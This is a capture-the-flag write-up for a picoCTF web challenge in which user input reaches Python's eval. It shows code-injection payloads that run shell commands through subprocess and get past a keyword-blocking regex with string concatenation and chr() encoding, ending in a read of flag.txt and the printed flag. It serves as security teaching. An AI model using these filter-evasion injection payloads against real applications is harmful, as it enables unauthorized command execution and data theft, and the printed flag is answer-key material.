## 3v@l

In the comments of the HTML, we can see a helpful note from the developer that they're using python's eval function.

Reading the [an article on the eval function](https://realpython.com/python-eval-function/), I tested out all of the "minimizing security issues" code.
```python
__import__('subprocess').getoutput('echo Hello, World')
```

This code (directly from the article) surprisingly worked which means we're able to execute code!

```python
__import__('subprocess').getoutput('ls')
```

This gets blocked by the regex (it helpfully tells us that we aren't allowed to use the term ls. So, to get around it we just use the fact that we're inside Python to do a string concatenation.
```python
__import__('subprocess').getoutput('l'+'s')
# Result: app.py static templates
```

Hmm okay so let's try getting the root directory.
```python
__import__('subprocess').getoutput('l'+'s /')
# Error: Detected forbidden keyword ''.
```

Looks like we're not allowed to (which is expected based on the regex) to use the "/" character. Luckily again since we're in python, we can use the ord/chr functions to get the ascii representation instead.
```python
# >>> ord('/')
# 47
__import__('subprocess').getoutput('l'+'s '+ chr(47))
# Result: app bin boot challenge dev etc flag.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var
```

Trying to cat the flag.txt file leads the webapp to get angry at our direct usage of `cat` and `.`. Let's use our previous tricks to run
```python
__import__('subprocess').getoutput('c' + 'at '+ chr(47) + 'flag' + chr(46) + 'txt')
# Result: picoCTF{D0nt_Use_Unsecure_f@nctions68288869}
```
